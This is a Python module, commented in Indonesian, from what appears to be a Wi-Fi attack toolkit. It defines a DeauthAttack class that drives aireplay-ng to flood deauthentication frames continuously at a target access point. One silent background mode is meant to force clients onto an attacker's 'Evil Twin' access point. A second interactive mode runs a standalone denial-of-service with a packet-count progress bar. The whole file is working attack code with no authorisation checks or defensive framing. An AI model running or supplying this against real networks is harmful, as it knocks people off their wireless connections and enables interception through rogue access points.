import os
import sys
import time
import subprocess

class DeauthAttack:
    def __init__(self, config, colors):
        self.config = config
        self.colors = colors

    def start_silent(self, bssid, ch, iface):
        """
        MODE BACKGROUND: Digunakan oleh Evil Twin.
        Tanpa output berisik, langsung nembak target agar pindah ke AP kita.
        """
        c = self.colors
        
        # 1. Pastikan interface di channel yang benar
        subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(ch)], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # 2. Command Aireplay (Mode Flood)
        cmd = [
            "sudo", "aireplay-ng",
            "-0", "0",              # 0 = Continuous attack
            "-a", bssid,            # BSSID Target
            "--ignore-negative-one", 
            iface
        ]

        print(f"  {c.INFO} {c.R}Deauth engine nembak {bssid} di background...{c.NC}")

        # Jalankan tanpa blocking agar program utama bisa lanjut
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return process

    def start_dos(self, targets):
        """
        MODE STANDALONE: Digunakan dari menu utama (Menu 03).
        Punya visualisasi progress bar biar lu tau serangannya jalan atau enggak.
        """
        c = self.colors
        if not targets:
            print(f"\n{c.ERR} {c.R}Target list kosong. Scan (Menu 01) dulu bang!{c.NC}")
            return

        try:
            # 1. Pilih Target dari hasil Scan
            print(f"\n{c.Q} Pilih ID Target untuk di-DoS:")
            val = input(f"  {c.B}Selection > {c.NC}").strip()
            
            if not val: return

            idx = int(val) - 1
            target = targets[idx]
            bssid = target.get('bssid')
            ch = target.get('ch')
            essid = target.get('essid', 'Unknown')
            iface = getattr(self.config, 'iface', 'wlan0mon')

            # 2. Eksekusi dengan Visualisasi
            self._execute_visual_attack(essid, bssid, ch, iface)

        except (ValueError, IndexError):
            print(f"{c.ERR} ID kagak valid, pilih yang bener bang.")

    def _execute_visual_attack(self, essid, bssid, ch, iface):
        """Logic tampilan progress bar yang cakep buat terminal"""
        c = self.colors
        
        # Set Channel
        subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(ch)], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print(f"\n  {c.G}┌──────────────────────────────────────────┐")
        print(f"    {c.BOLD}LAUNCHING DEAUTH ATTACK{c.NC}")
        print(f"    {c.W}Target SSID : {c.Y}{essid}{c.NC}")
        print(f"    {c.W}Target MAC  : {c.Y}{bssid}{c.NC}")
        print(f"    {c.W}Interface   : {c.Y}{iface}{c.NC}")
        print(f"  {c.G}└──────────────────────────────────────────┘{c.NC}")
        print(f"  {c.INFO} Tekan {c.R}Ctrl+C{c.NC} buat stop serangan.")

        # Command Aireplay
        cmd = [
            "sudo", "aireplay-ng", "-0", "0", "-a", bssid, "--ignore-negative-one", iface
        ]

        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True
        )
        
        sent = 0
        try:
            while True:
                line = process.stdout.readline()
                if "Sending" in line:
                    sent += 1
                    # Animasi bar jalan
                    anim_index = int((time.time() * 8) % 21)
                    bar = "█" * anim_index + "░" * (20 - anim_index)
                    
                    sys.stdout.write(
                        f"\r  {c.OK} Status: [{c.G}{bar}{c.NC}] Sent: {c.Y}{sent:05d}{c.NC} Packets"
                    )
                    sys.stdout.flush()
                
                if process.poll() is not None:
                    break
        except KeyboardInterrupt:
            print(f"\n\n  {c.WARN} {c.R}Serangan dihentikan.{c.NC}")
            process.terminate()
        finally:
            process.wait()
            print(f"  {c.OK} Interface {iface} ready for next mission.")